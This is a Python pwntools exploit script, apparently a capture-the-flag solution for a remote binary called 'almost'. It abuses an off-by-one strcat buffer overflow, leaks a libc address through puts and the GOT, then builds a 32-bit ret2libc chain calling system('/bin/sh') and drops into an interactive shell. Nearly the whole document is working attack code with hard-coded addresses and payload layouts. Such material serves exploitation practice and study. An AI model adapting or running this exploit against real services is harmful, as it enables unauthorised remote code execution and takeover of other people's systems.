# 1 off by one to strcat large buffer => buffer overflow
# 2 typical 32bit ret2libc ROP

from pwn import *
puts_plt = 0x80483b0
main = 0x80486f5
pop_ebx = 0x08048371
start_main_got = 0x0804a018
#p = process("./almost")
p = remote("jh2i.com",50017)
p.recvuntil("protocol:\n")
p.sendline("A"*64)
p.recvuntil("domain:\n")
p.sendline("A"*64)
p.recvuntil("path:\n")
payload = ""
payload += "A"*10
payload += p32(puts_plt)
payload += p32(pop_ebx)
payload += p32(start_main_got)
payload += p32(main)
payload += "A"*(63 - len(payload))
#pause()
p.sendline(payload)
p.recvuntil("Result:\n")
p.recvuntil("AAAAA\n")
data = p.recv(4)
p.recv(8000)
leak = u32(data)
print "leak: ",hex(leak)
base = leak - 0x018da0
system = base + 0x03cd80
binsh = base + 0x17bb8f
print "base: ",hex(base)
print "system: ",hex(system)
print "binsh: ",hex(binsh)
payload = ""
payload += "A"*10
payload += p32(system)
payload += "AAAA"
payload += p32(binsh)
payload += "A"*(63 - len(payload))
#p.recvuntil("protocol:\n")
p.sendline("A"*64)
p.recvuntil("domain:\n")
p.sendline("A"*64)
p.recvuntil("path:\n")
p.sendline(payload)
p.interactive()
